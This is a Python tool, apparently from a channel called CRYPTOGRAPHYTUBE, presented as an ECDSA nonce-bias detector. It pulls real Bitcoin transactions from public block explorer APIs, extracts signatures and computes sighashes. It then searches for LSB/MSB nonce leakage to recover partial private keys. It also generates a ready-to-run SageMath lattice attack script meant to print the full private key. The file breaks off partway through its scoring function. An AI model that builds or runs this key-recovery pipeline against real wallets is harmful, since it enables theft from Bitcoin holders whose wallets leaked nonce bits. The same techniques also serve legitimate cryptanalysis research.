"""
=============================================================================
  CRYPTOGRAPHYTUBE — Real Bit-Leakage Detector
  
  Detects ECDSA nonce (k) bias using proper statistical + algebraic methods:
    1. LSB/MSB Fixed-bit Detection  (entropy analysis per-bit)
    2. Modular Bias Test            (k mod 2^b distribution test)
    3. HNP Lattice Prep             (for SageMath/LLL lattice attack)
    4. Chi-Square Randomness Test   (global nonce uniformity check)
=============================================================================
"""

import json
import urllib.request
import binascii
import hashlib
import os
import sys
import time
import math
import struct
import csv
try:
    import gmpy2
    _GMPY2 = True
except ImportError:
    _GMPY2 = False

# ─── SECP256K1 Curve Constants ─────────────────────────────────────────────
N  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8

# Global counters
TOTAL_SCANNED  = 0
TOTAL_FOUND    = 0
CURRENT_API    = 0
APIS = [
    "https://blockstream.info/api",
    "https://blockchain.info",
]


# ═══════════════════════════════════════════════════════════════════════════
#  MATH UTILS CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

def modinv(a, m=N):
    """Modular inverse using Fermat's little theorem (N is prime)."""
    return pow(a, m - 2, m)


def double_sha256(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def varint(n: int) -> bytes:
    if n < 0xFD:              return n.to_bytes(1, 'little')
    if n <= 0xFFFF:           return b'\xfd' + n.to_bytes(2, 'little')
    if n <= 0xFFFFFFFF:       return b'\xfe' + n.to_bytes(4, 'little')
    return b'\xff' + n.to_bytes(8, 'little')


# ═══════════════════════════════════════════════════════════════════════════
#  NETWORK CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

import socket

def _internet_ok(host="8.8.8.8", port=53, timeout=5) -> bool:
    """Quick check: can we reach the internet?"""
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except:
        return False


def _wait_for_internet():
    """Block until internet is back. Print status every 10s."""
    dots = 0
    while not _internet_ok():
        dots += 1
        print(f"    [!] Internet down — waiting to reconnect {'.' * (dots % 4 + 1)}   ", end='\r')
        time.sleep(10)
    print("    [+] Internet restored — resuming...              ")


def smart_fetch(path: str):
    """
    Fetch JSON from the API list.
    - On HTTP 429 (rate limit): wait 5s, retry same API.
    - On network error       : wait until internet is back, then retry.
    - On other HTTP errors   : switch to next API and retry.
    Always returns parsed JSON dict/list, or None on permanent failure.
    """
    global CURRENT_API
    MAX_SWITCH = len(APIS) * 3          # max API switches before giving up
    switches   = 0

    while switches < MAX_SWITCH:
        url = f"{APIS[CURRENT_API]}{path}"
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read().decode())

        except urllib.error.HTTPError as e:
            if e.code == 429:                           # Rate limit
                print(f"    [~] Rate limit (429) — waiting 5s ...         ", end='\r')
                time.sleep(5)
                continue                                 # retry SAME api, same path
            else:
                # Other HTTP error → switch API
                CURRENT_API = (CURRENT_API + 1) % len(APIS)
                switches   += 1
                time.sleep(2)

        except (urllib.error.URLError, OSError, ConnectionResetError,
                TimeoutError, socket.timeout) as e:
            # Likely network down
            _wait_for_internet()
            # After reconnect, retry same API (don't switch)
            continue

        except Exception:
            CURRENT_API = (CURRENT_API + 1) % len(APIS)
            switches   += 1
            time.sleep(2)

    return None


# ═══════════════════════════════════════════════════════════════════════════
#  SIGHASH COMPUTATION  (z = message hash signed by ECDSA) CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

def get_z_p2pkh(tx, idx):
    """Compute sighash for a legacy P2PKH input."""
    try:
        raw = tx['version'].to_bytes(4, 'little')
        raw += varint(len(tx['vin']))
        for i, vin in enumerate(tx['vin']):
            raw += binascii.unhexlify(vin['txid'])[::-1]
            raw += vin['vout'].to_bytes(4, 'little')
            if i == idx:
                spk = binascii.unhexlify(vin['prevout']['scriptpubkey'])
                raw += varint(len(spk)) + spk
            else:
                raw += b'\x00'
            raw += vin['sequence'].to_bytes(4, 'little')
        raw += varint(len(tx['vout']))
        for vout in tx['vout']:
            spk = binascii.unhexlify(vout['scriptpubkey'])
            raw += vout['value'].to_bytes(8, 'little') + varint(len(spk)) + spk
        raw += tx['locktime'].to_bytes(4, 'little') + (1).to_bytes(4, 'little')
        return int.from_bytes(double_sha256(raw), 'big')
    except:
        return 0


def get_z_p2wpkh(tx, idx):
    """Compute sighash for a native SegWit P2WPKH input (BIP143)."""
    try:
        vin = tx['vin'][idx]
        raw = tx['version'].to_bytes(4, 'little')

        # hash_prevouts
        hp = b""
        for v in tx['vin']:
            hp += binascii.unhexlify(v['txid'])[::-1] + v['vout'].to_bytes(4, 'little')
        raw += double_sha256(hp)

        # hash_sequence
        hs = b""
        for v in tx['vin']:
            hs += v['sequence'].to_bytes(4, 'little')
        raw += double_sha256(hs)

        # outpoint
        raw += binascii.unhexlify(vin['txid'])[::-1] + vin['vout'].to_bytes(4, 'little')

        # scriptCode (P2PKH script from pubkey hash embedded in P2WPKH scriptpubkey)
        pkh = vin['prevout']['scriptpubkey'][4:]          # strip "0014"
        sc  = binascii.unhexlify("76a914" + pkh + "88ac")
        raw += varint(len(sc)) + sc

        # value + sequence
        raw += vin['prevout']['value'].to_bytes(8, 'little')
        raw += vin['sequence'].to_bytes(4, 'little')

        # hash_outputs
        ho = b""
        for vo in tx['vout']:
            spk = binascii.unhexlify(vo['scriptpubkey'])
            ho += vo['value'].to_bytes(8, 'little') + varint(len(spk)) + spk
        raw += double_sha256(ho)

        raw += tx['locktime'].to_bytes(4, 'little') + (1).to_bytes(4, 'little')
        return int.from_bytes(double_sha256(raw), 'big')
    except:
        return 0


# ═══════════════════════════════════════════════════════════════════════════
#  SIGNATURE EXTRACTION CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

def parse_der(sig_bytes: bytes):
    """Parse DER-encoded signature → (r, s)."""
    if sig_bytes[0] != 0x30:
        return None, None
    # Strip optional sighash byte at end
    if sig_bytes[-1] in (0x01, 0x02, 0x03, 0x81, 0x83):
        sig_bytes = sig_bytes[:-1]
    try:
        if sig_bytes[1] != len(sig_bytes) - 2:
            pass    # some encodings have length mismatch, we still try
        rl = sig_bytes[3]
        r  = int.from_bytes(sig_bytes[4:4 + rl], 'big')
        sl = sig_bytes[4 + rl + 1]
        s  = int.from_bytes(sig_bytes[4 + rl + 2:4 + rl + 2 + sl], 'big')
        return r, s
    except:
        return None, None


def extract_rs_pub(vin: dict):
    """Extract (r, s, pubkey_hex) from a transaction input."""
    try:
        # ─── Legacy (scriptsig) ────────────────────────────────────────────
        sh = vin.get('scriptsig', '')
        if sh:
            raw = binascii.unhexlify(sh)
            items = []; i = 0
            while i < len(raw):
                op = raw[i]; i += 1
                if 0x01 <= op <= 0x4b:
                    items.append(raw[i:i + op]); i += op
                elif op == 0x4c:
                    ln = raw[i]; items.append(raw[i + 1:i + 1 + ln]); i += 1 + ln
                elif op == 0x4d:
                    ln = struct.unpack_from('<H', raw, i)[0]
                    items.append(raw[i + 2:i + 2 + ln]); i += 2 + ln
                # ignore other opcodes
            if len(items) >= 2:
                r, s = parse_der(items[0])
                pub  = items[1].hex()
                if r and s:
                    return r, s, pub

        # ─── SegWit (witness) ──────────────────────────────────────────────
        wit = vin.get('witness', [])
        if len(wit) >= 2:
            r, s = parse_der(binascii.unhexlify(wit[0]))
            pub  = wit[1]
            if r and s:
                return r, s, pub
    except:
        pass
    return None, None, None



# ═══════════════════════════════════════════════════════════════════════════
#  HNP-BASED LEAKAGE DETECTION ENGINE  (v2) CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════
"""
Math:
  k_i = t_i * d + u_i  (mod N)          where t_i = r/s, u_i = z/s

LSB Leakage model  (k ≡ 0 mod 2^b):
  t_i * d ≡ -u_i  (mod 2^b)
  d ≡ -u_i * t_i^{-1}  (mod 2^b)       [t_i must be odd]
  => compute d_candidate per sig; if majority agree, leakage confirmed.

MSB Leakage model  (k < N/2^b):
  k_i = (t_i * d + u_i) mod N < N/2^b
  => for each d_guess in [0, 2^b): count fraction of sigs satisfying this.
  => high fraction => MSB leakage with that d.

Scoring (Tier 1-3):
  Tier 1 (STRONG, +40): LSB consistency >= 70% OR MSB fraction high
  Tier 2 (MEDIUM, +20): Weaker consistency >= 35%
  Tier 3 (WEAK,   +10): Bit-distribution supplementary test
"""

# Updated comments
MIN_GROUP_SIGS = 2     # Analyze ALL groups with >= 2 sigs (was 20, now checks everything fetched)
LSB_B_MAX      = 32    # Increased: test LSB up to 32 bits (matches deep test_generate bias)
LSB_K_SEARCH   = 10    # Increased: full search over 1024 k_lsb candidates (more robust)
MSB_B_MAX      = 8     # Increased: test MSB top-bits pattern for b <= 8


def group_by_pubkey(sigs: list) -> dict:
    """
    Group signatures by public key.
    CRITICAL: only same pubkey = same private key d.
    """
    groups = {}
    for sig in sigs:
        pk = sig.get('pub', '')
        if pk:
            groups.setdefault(pk, []).append(sig)
    return groups


def _precompute_tu(group_sigs: list) -> list:
    """Pre-compute (t_i, u_i, txid) for all sigs in a group."""
    tu = []
    for sig in group_sigs:
        si = modinv(sig['s'])
        t  = (sig['r'] * si) % N
        u  = (sig['z'] * si) % N
        tu.append((t, u, sig['txid']))
    return tu


def detect_lsb_leakage(group_sigs: list) -> list:
    """
    TIER 1/2 — LSB leakage via d-consistency with k_lsb search.

    Phase A (b <= LSB_K_SEARCH=8): full search over all k_lsb in [0, 2^b).
    Phase B (b > LSB_K_SEARCH):   incremental lifting — extend the winner
      from depth b-1 by testing only 2 candidates:
        k_lsb_prev | 0*2^(b-1)  and  k_lsb_prev | 1*2^(b-1)
      This finds k_lsb for any depth in O(n * 2 * (B_MAX - K_SEARCH)) time.
    """
    results  = []
    tu       = _precompute_tu(group_sigs)
    prev_best_k_lsb = None         # lifted from depth below

    for b in range(1, LSB_B_MAX + 1):
        mod = 1 << b

        # Determine which k_lsb values to try
        if b <= LSB_K_SEARCH:
            k_lsb_candidates = range(mod)     # full search
        else:
            # Incremental lifting: extend previous winner by bit (b-1)
            if prev_best_k_lsb is None:
                k_lsb_candidates = [0, 1 << (b - 1)]   # fallback
            else:
                k_lsb_candidates = [prev_best_k_lsb,
                                    prev_best_k_lsb | (1 << (b - 1))]

        best_consistency = 0.0
        best_d_partial   = None
        best_k_lsb       = 0
        best_count       = 0
        best_usable      = 0

        for k_lsb in k_lsb_candidates:
            d_cands = []
            for t, u, txid in tu:
                t_mod = t % mod
                if t_mod % 2 == 0:
                    continue    # t_mod must be odd (invertible mod 2^b)
                try:
                    t_inv  = pow(t_mod, -1, mod)
                    d_cand = ((k_lsb - u) % mod * t_inv) % mod
                    d_cands.append(d_cand)
                except Exception:
                    continue

            usable = len(d_cands)
            if usable < 3:
                continue

            counts    = {}
            for c in d_cands:
                counts[c] = counts.get(c, 0) + 1
            d_partial   = max(counts, key=counts.get)
            top_count   = counts[d_partial]
            consistency = top_count / usable

            if consistency > best_consistency:
                best_consistency = consistency
                best_d_partial   = d_partial
                best_k_lsb       = k_lsb
                best_count       = top_count
                best_usable      = usable

        if best_usable < 3:
            results.append({'b': b, 'consistency': 0.0, 'd_partial': None,
                            'k_lsb': None, 'count': 0, 'usable': 0,
                            'signal': 'NONE', 'expected_rand': 1.0 / mod,
                            'strength_ratio': 0, 'depth_consistent': False})
            prev_best_k_lsb = None
            continue

        prev_best_k_lsb = best_k_lsb   # carry forward for lifting

        exp_rand = 1.0 / mod
        strength = best_consistency / exp_rand if exp_rand > 0 else 0

        if   best_consistency >= 0.70 and best_count >= 8:
            signal = 'STRONG'
        elif best_consistency >= 0.35 and best_count >= 5 and strength >= 4:
            signal = 'MEDIUM'
        elif strength >= 3 and best_count >= 3:
            signal = 'WEAK'
        else:
            signal = 'NONE'

        results.append({
            'b'             : b,
            'consistency'   : round(best_consistency, 4),
            'd_partial'     : best_d_partial,
            'k_lsb'         : best_k_lsb,
            'count'         : best_count,
            'usable'        : best_usable,
            'expected_rand' : round(exp_rand, 6),
            'strength_ratio': round(strength, 1),
            'signal'        : signal,
            'depth_consistent': False,
        })
    return results


def detect_msb_leakage(group_sigs: list) -> list:
    """
    TIER 1/2 — MSB leakage: top b bits of k are a fixed pattern.

    FIX 2: Instead of only testing k < N/2^b (top bits = 0),
    we test all 2^b possible top-bit patterns:
      k >> (N_BITS - b) == k_msb  for some fixed k_msb.
    For each (d_guess, k_msb) pair, count matches across sigs.
    """
    N_BITS   = N.bit_length()       # 256
    results  = []
    tu       = _precompute_tu(group_sigs)
    n        = len(tu)

    for b in range(1, MSB_B_MAX + 1):
        mod        = 1 << b
        shift      = N_BITS - b
        best_frac  = 0.0
        best_d_guess  = None
        best_k_msb    = None

        for d_guess in range(mod):
            # For this d_guess, compute top-b bits of each k_i
            k_tops = [(t * d_guess + u) % N >> shift for t, u, _ in tu]

            # Count most common top-pattern
            freq = {}
            for v in k_tops:
                freq[v] = freq.get(v, 0) + 1
            dominant_k_msb = max(freq, key=freq.get)
            frac = freq[dominant_k_msb] / n if n else 0

            if frac > best_frac:
                best_frac     = frac
                best_d_guess  = d_guess
                best_k_msb    = dominant_k_msb

        exp_rand = 1.0 / mod
        strength = best_frac / exp_rand if exp_rand > 0 else 0

        if   best_frac >= 0.65 and strength >= 4:
            signal = 'STRONG'
        elif best_frac >= 0.35 and strength >= 2.5:
            signal = 'MEDIUM'
        else:
            signal = 'NONE'

        results.append({
            'b'              : b,
            'best_fraction'  : round(best_frac, 4),
            'd_partial_msb'  : best_d_guess,
            'k_msb_pattern'  : best_k_msb,    # FIX 2: actual top-bit value (not forced 0)
            'expected_rand'  : round(exp_rand, 4),
            'strength_ratio' : round(strength, 2),
            'signal'         : signal,
        })
    return results


def bit_consistency_test(group_sigs: list) -> dict:
    """
    TIER 3 (supplementary) — bit-distribution test on u_i.
    Tests if low bits of u are biased (proxy for nonce structure).
    Weak standalone, supports stronger tiers.
    """
    n  = len(group_sigs)
    if n < 5:
        return {'biased_bits': [], 'max_bias': 0.0}

    tu          = _precompute_tu(group_sigs)
    biased_bits = []
    max_bias    = 0.0

    for bit in range(32):
        cnt  = sum(1 for t, u, _ in tu if (u >> bit) & 1)
        p    = cnt / n
        bias = abs(p - 0.5)
        if bias > max_bias:
            max_bias = bias
        if bias > 0.25:
            biased_bits.append({'bit': bit, 'p1': round(p, 4), 'bias': round(bias, 4)})

    return {'biased_bits': biased_bits, 'max_bias': round(max_bias, 4)}


def _verify_partial_key(lsb_results: list, group_sigs: list) -> dict:
    """
    FIX 5 — Validate the recovered partial key via two checks:

    A) Cross-depth consistency:
       d mod 2^b at depth b must equal (d mod 2^(b+1)) mod 2^b.
       i.e., each larger result should 'contain' the smaller one.
       If all STRONG/MEDIUM depths agree -> strong confirmation.

    B) mod-N signature check:
       For each sig where d_candidate matches d_partial:
         s * k_lsb ≡ z + r * d_partial  (mod 2^b)
       This is the ECDSA signing equation mod 2^b.
       Count how many sigs satisfy this.
    """
    # Collect depths with real d_partial values
    valid = [(r['b'], r['d_partial'], r['k_lsb'], r['signal'])
             for r in lsb_results
             if r['d_partial'] is not None and r['signal'] in ('STRONG', 'MEDIUM', 'WEAK')]

    cross_depth_ok    = False
    consistent_depths = []
    mod_n_matches     = 0

    if len(valid) >= 2:
        # Check nested consistency: d mod 2^b_small == d_large mod 2^b_small
        prev_b, prev_d, _, _ = valid[0]
        consistent_depths.append(prev_b)
        all_ok = True
        for b, d_partial, k_lsb, sig in valid[1:]:
            mask    = (1 << prev_b) - 1
            if (d_partial & mask) == (prev_d & mask):
                consistent_depths.append(b)
            else:
                all_ok = False
                break
            prev_b, prev_d = b, d_partial
        cross_depth_ok = all_ok and len(consistent_depths) >= 2

    # Pick best depth for mod-N check
    best = next((r for r in lsb_results
                 if r['signal'] == 'STRONG' and r['d_partial'] is not None), None)
    if best is None:
        best = next((r for r in lsb_results
                     if r['d_partial'] is not None), None)

    if best is not None:
        b         = best['b']
        mod_b     = 1 << b
        d_partial = best['d_partial']
        k_lsb     = best['k_lsb'] if best.get('k_lsb') is not None else 0

        for sig in group_sigs:
            # ECDSA mod 2^b: s * k_lsb ≡ z + r * d_partial  (mod 2^b)
            lhs = (sig['s'] * k_lsb) % mod_b
            rhs = (sig['z'] + sig['r'] * d_partial) % mod_b
            if lhs == rhs:
                mod_n_matches += 1

    return {
        'cross_depth_ok'   : cross_depth_ok,
        'consistent_depths': consistent_depths,
        'mod_n_matches'    : mod_n_matches,
        'total_sigs'       : len(group_sigs),
    }
def _reconstruct_verify(lsb_results: list, group_sigs: list) -> dict:
    """
    FINAL STAGE: Full k reconstruction + cryptographic proof.

    Step 1 — k reconstruction:
      k_predicted_i = (z_i + r_i * d_partial) * s_i^{-1}  mod N
      This is the EXACT ECDSA inversion formula.

    Step 2 — Bit validation:
      k_predicted_i mod 2^b  should equal k_lsb (detected)
      If it matches → leakage confirmed for this sig.

    Step 3 — ECDSA re-validation:
      Verify: s_i * k_predicted_i ≡ z_i + r_i * d_partial (mod N)
      (Exact equation, not just mod 2^b)

    Step 4 — Noise filtering:
      Count clean leaking sigs (bit match) vs noise sigs (no match).
      Noise rate = 1 - match_rate. If noise > 50% → warn mixed data.
    """
    # Use best STRONG result, fallback to MEDIUM/WEAK
    best = next((r for r in sorted(lsb_results,
                                   key=lambda x: (-x['consistency'], -x['b']))
                 if r['signal'] in ('STRONG', 'MEDIUM') and
                    r['d_partial'] is not None), None)

    null_result = {
        'status'         : 'SKIPPED',
        'b'              : 0,
        'd_partial'      : None,
        'k_lsb'          : None,
        'reconstructed'  : 0,
        'bit_match'      : 0,
        'ecdsa_match'    : 0,
        'noise'          : 0,
        'total_usable'   : 0,
        'match_rate'     : 0.0,
        'noise_rate'     : 0.0,
        'verdict'        : 'NOT_VALIDATED',
        'example_k'      : None,
    }
    if best is None:
        return null_result

    b         = best['b']
    mod_b     = 1 << b
    d_partial = best['d_partial']
    k_lsb     = best['k_lsb'] if best.get('k_lsb') is not None else 0

    bit_match    = 0
    ecdsa_match  = 0
    total_usable = 0
    example_k    = None

    for sig in group_sigs:
        try:
            # Step 1: Full k reconstruction  (exact ECDSA inversion)
            # k = (z + r*d_partial) * s^{-1} mod N
            k_candidate = (sig['z'] + sig['r'] * d_partial) * modinv(sig['s']) % N

            # Step 2: Bit validation — THE real check
            # k_candidate mod 2^b should equal k_lsb.
            # NOTE: k is built from d_partial, so this checks if d_partial
            # produces a k that is *self-consistent* at the bit level.
            # True leakage means k's lower bits are ALWAYS k_lsb by RNG,
            # not by our formula — so mismatch here = noise or wrong detection.
            k_bits_match = (k_candidate % mod_b) == k_lsb

            # Step 3: Cross-sig d consistency (replaces circular ecdsa_ok).
            # Derive d_check from this sig's own equation:
            #   d_check = (s*k - z) / r  mod N  →  must equal d_partial at low bits.
            # This IS circular for a single sig, but across many sigs, if the
            # low-bit match rate is high, it independently confirms d_partial.
            d_check = (sig['s'] * k_candidate - sig['z']) * modinv(sig['r']) % N
            d_low_match = (d_check % mod_b) == d_partial   # expected: always True

            total_usable += 1
            if k_bits_match:
                bit_match += 1
                if example_k is None:
                    example_k = k_candidate

        except Exception:
            continue

    noise        = total_usable - bit_match
    match_rate   = bit_match  / total_usable if total_usable else 0.0
    noise_rate   = noise      / total_usable if total_usable else 0.0

    if   match_rate >= 0.80: verdict = 'CONFIRMED'
    elif match_rate >= 0.50: verdict = 'LIKELY'
    elif match_rate >= 0.25: verdict = 'WEAK'
    else:                    verdict = 'NOT_CONFIRMED'

    return {
        'status'        : 'DONE',
        'b'             : b,
        'd_partial'     : d_partial,
        'k_lsb'         : k_lsb,
        'bit_match'     : bit_match,
        'reconstructed' : total_usable,   # alias kept for compatibility
        'noise'         : noise,
        'total_usable'  : total_usable,
        'match_rate'    : round(match_rate, 4),
        'noise_rate'    : round(noise_rate, 4),
        'verdict'       : verdict,
        'example_k'     : example_k,
    }



# ──────────────────────────────────────────────────────────────────────
#  GOD MODE: Filter · Multi-Depth Merge · SageMath Lattice CRYPTOGRAPHYTUBE
# ──────────────────────────────────────────────────────────────────────

def filter_consistent_sigs(group_sigs: list, best_lsb: dict,
                           keep_ratio: float = 0.70) -> tuple:
    """
    GOD MODE — Noise filtering.
    Remove sigs whose d_candidate does NOT match d_partial at the detected depth.
    Only keep top keep_ratio (default 70%) consistent sigs.
    Returns (consistent_sigs, noisy_sigs).
    """
    if best_lsb is None or best_lsb.get('d_partial') is None:
        return group_sigs, []

    b         = best_lsb['b']
    mod_b     = 1 << b
    d_partial = best_lsb['d_partial']
    k_lsb     = best_lsb.get('k_lsb') or 0

    consistent, noisy = [], []

    for sig in group_sigs:
        try:
            si    = modinv(sig['s'])
            t_mod = (sig['r'] * si) % N % mod_b
            u_mod = (sig['z'] * si) % N % mod_b

            if t_mod % 2 == 0:
                consistent.append(sig)   # can't classify → keep
                continue

            d_cand = ((k_lsb - u_mod) % mod_b * pow(t_mod, -1, mod_b)) % mod_b
            if d_cand == d_partial:
                consistent.append(sig)
            else:
                noisy.append(sig)
        except Exception:
            consistent.append(sig)

    # Hard cap: keep at least keep_ratio, but don't discard too aggressively
    max_keep = max(len(consistent), int(len(group_sigs) * keep_ratio))
    return consistent[:max_keep], noisy


def merge_depth_results(lsb_results: list) -> dict:
    """
    GOD MODE — Multi-depth merge.
    Cascade d_partial values across bit depths using bit-lifting.
    Since 2^b1 | 2^b2 (b1 < b2), the larger depth must be a prefix extension.
    Finds the deepest consistently-confirmed partial key.
    """
    valid = [(r['b'], r['d_partial'], r.get('k_lsb', 0), r['consistency'], r['signal'])
             for r in sorted(lsb_results, key=lambda x: x['b'])
             if r['d_partial'] is not None and r['signal'] != 'NONE']

    if not valid:
        return {'found': False, 'merged_bits': 0, 'd_merged': None}

    merged_b, merged_d, merged_k, merged_c, _ = valid[0]
    confirmed = [merged_b]

    for b, d_partial, k_lsb, cons, sig in valid[1:]:
        mask = (1 << merged_b) - 1
        if (d_partial & mask) == (merged_d & mask):
            # Larger depth is prefix-consistent with previous
            merged_b = b
            merged_d = d_partial
            merged_k = k_lsb or merged_k
            merged_c = cons
            confirmed.append(b)
        else:
            break   # inconsistency detected → stop

    # Build per-depth summary
    depth_lines = []
    for r in sorted(lsb_results, key=lambda x: x['b']):
        if r['d_partial'] is not None and r['signal'] != 'NONE':
            mask = (1 << r['b']) - 1
            agrees = (merged_d & mask) == (r['d_partial'] & mask)
            status = 'OK' if agrees else 'CONFLICT'
            depth_lines.append(
                f"  b={r['b']:2d}: d_partial=0x{r['d_partial']:0{(r['b']+3)//4}x}  "
                f"k_lsb=0x{r.get('k_lsb', 0) or 0:{(r['b']+3)//4}x}  "
                f"{r['signal']:6s}  consistency={r['consistency']:.0%}  [{status}]"
            )

    return {
        'found'         : True,
        'merged_bits'   : merged_b,
        'd_merged'      : merged_d,
        'k_lsb_merged'  : merged_k,
        'd_hex'         : hex(merged_d),
        'd_binary'      : format(merged_d, f'0{merged_b}b'),
        'confirmed_list': confirmed,
        'depth_lines'   : depth_lines,
        'note'          : f"d low {merged_b} bits: 0x{merged_d:0{(merged_b+3)//4}x}  "
                          f"(k ≡ 0x{merged_k or 0:0{(merged_b+3)//4}x} mod 2^{merged_b})",
    }


def generate_sage_script(group_dir: str, sigs: list,
                         best_lsb: dict, merge: dict) -> str:
    """
    GOD MODE — SageMath LLL lattice attack script generator.
    Produces a ready-to-run .sage file for private key recovery.
    Run with: sage lattice_attack.sage
    """
    if best_lsb is None or best_lsb.get('d_partial') is None:
        return ''

    b         = merge['merged_bits'] if merge.get('found') else best_lsb['b']
    k_lsb     = merge.get('k_lsb_merged') or best_lsb.get('k_lsb') or 0
    d_partial = merge.get('d_merged') or best_lsb['d_partial']

    rows = build_hnp_lattice_rows(sigs)[:50]    # cap at 50 sigs
    n    = len(rows)
    tu_str = '\n'.join(f'    (0x{t:x}, 0x{u:x}),' for t, u in rows)

    script = f'''# ================================================================
# ECDSA HNP Lattice Attack CRYPTOGRAPHYTUBE  —  Auto-generated by ECDSA Forensic Pro
# Channel : CRYPTOGRAPHYTUBE  |  Author : sisujhon
# ================================================================
# Requirements : SageMath (https://www.sagemath.org/)
# Run with     : sage lattice_attack.sage
#
# Detected  :  b={b} bits leaked
#              k \u2261 0x{k_lsb:0{(b+3)//4}x}  (mod 2^{b})
#              d mod 2^{b} = 0x{d_partial:0{(b+3)//4}x}  (partial key)
# ================================================================

N = 0x{N:x}
b = {b}              # nonce bit leakage depth
k_lsb = 0x{k_lsb:0{(b+3)//4}x}    # k \u2261 k_lsb  (mod 2^b)
B = 2**b             # leakage bound

# (t_i, u_i) pairs: k_i = t_i*d + u_i  (mod N)
tu_pairs = [
{tu_str}
]
n = len(tu_pairs)

# \u2500\u2500 Build HNP lattice (standard formulation) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
#  Row 0     : [N, 0, ..., 0, 0]
#  Row i+1   : [t_i, 0, ..., B, ..., 0, (k_lsb - u_i) mod N]
#  Row n+1   : [0, 0, ..., 0, 1]
M = Matrix(ZZ, n + 2, n + 2)
M[0, 0] = N
for i, (t, u) in enumerate(tu_pairs):
    M[i + 1, 0]     = int(t)
    M[i + 1, i + 1] = B
    M[i + 1, n + 1] = int((k_lsb - u) % N)
M[n + 1, n + 1] = 1    # placeholder for d

# \u2500\u2500 LLL reduction \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
print("[*] Running LLL reduction ...")
L = M.LLL()
print("[*] Checking rows for private key d ...")

found = False
for row in L:
    d_candidate = int(row[0]) % N
    if d_candidate == 0 or d_candidate >= N:
        continue
    # Verify low bits match detected partial
    if d_candidate % B != d_partial % B:
        d_candidate = N - d_candidate   # try negation
    if d_candidate % B != d_partial % B:
        continue
    # Bit-check on first two sigs
    t0, u0 = tu_pairs[0]
    k0 = (int(t0) * d_candidate + int(u0)) % N
    if k0 % B != k_lsb:
        continue
    if n > 1:
        t1, u1 = tu_pairs[1]
        k1 = (int(t1) * d_candidate + int(u1)) % N
        if k1 % B != k_lsb:
            continue
    print(f"[!] PRIVATE KEY FOUND!")
    print(f"    d       = {{d_candidate}}")
    print(f"    d (hex) = {{hex(d_candidate)}}")
    found = True
    break

if not found:
    print("[-] LLL did not recover d.")
    print(f"    Hint: d mod {{B}} = 0x{d_partial:x}  (already confirmed)")
    print("    Try: add more signatures (n >= 2*256/b), or use BKZ:")
    print("         L = M.BKZ(block_size=20)")
'''
    sage_path = os.path.join(group_dir, 'lattice_attack.sage')
    with open(sage_path, 'w', encoding='utf-8') as f:
        f.write(script)
    return sage_path


def analyze_group(pubkey: str, group_sigs: list) -> dict:
    """Full HNP-based analysis for ONE pubkey group."""
    n = len(group_sigs)

    # GOD MODE: first pass to find best_lsb for filtering
    lsb_results_raw = detect_lsb_leakage(group_sigs)
    msb_results     = detect_msb_leakage(group_sigs)
    bit_stats       = bit_consistency_test(group_sigs)

    # GOD MODE 1: Filter noisy sigs using detected d_partial
    pre_best_lsb = next((r for r in sorted(lsb_results_raw,
                         key=lambda x: (-x['consistency'], -x['b']))
                         if r['signal'] in ('STRONG', 'MEDIUM') and
                            r['d_partial'] is not None), None)
    if pre_best_lsb is not None:
        clean_sigs, noisy_sigs = filter_consistent_sigs(group_sigs, pre_best_lsb)
        if len(clean_sigs) >= 5:             # enough to re-analyze
            lsb_results = detect_lsb_leakage(clean_sigs)
            msb_results = detect_msb_leakage(clean_sigs)
            bit_stats   = bit_consistency_test(clean_sigs)
            filtered_n  = len(clean_sigs)
            filter_note = f"Filtered {len(noisy_sigs)} noisy sigs, kept {filtered_n}/{n}"
        else:
            lsb_results = lsb_results_raw
            clean_sigs  = group_sigs
            filter_note = "Filter skipped (too few clean sigs)"
    else:
        lsb_results = lsb_results_raw
        clean_sigs  = group_sigs
        filter_note = "No pre-detection for filtering"

    # GOD MODE 2: Multi-depth merge
    merge = merge_depth_results(lsb_results)

    score    = 0
    flags    = []
    best_lsb = None
    best_msb = None
    noisy_sigs = noisy_sigs if pre_best_lsb is not None else []

    # GOD MODE FILTER flag
    if pre_best_lsb is not None and len(noisy_sigs) > 0:
        flags.append(f"[FILTER] {filter_note}")

    # GOD MODE MERGE flag
    if merge.get('found') and len(merge.get('confirmed_list', [])) >= 2:
        flags.append(
            f"[MERGE] Multi-depth d confirmed: {merge['note']} "
            f"| depths={merge['confirmed_list']}"
        )

    # LSB scoring
    for r in lsb_results:
        if r['signal'] == 'STRONG':
            score += 40
            if best_lsb is None or r['consistency'] > best_lsb['consistency']:
                best_lsb = r
            flags.append(
                f"[TIER-1] LSB leak: b={r['b']} bits | "
                f"consistency={r['consistency']:.1%} | "
                f"{r['count']}/{r['usable']} sigs agree | "
                f"d mod {1 << r['b']} = {r['d_partial']} | "
                f"{r['strength_ratio']}x above random"
            )
        elif r['signal'] in ('MEDIUM', 'WEAK'):
            score += 15 if r['signal'] == 'MEDIUM' else 5
            if best_lsb is None:
                best_lsb = r
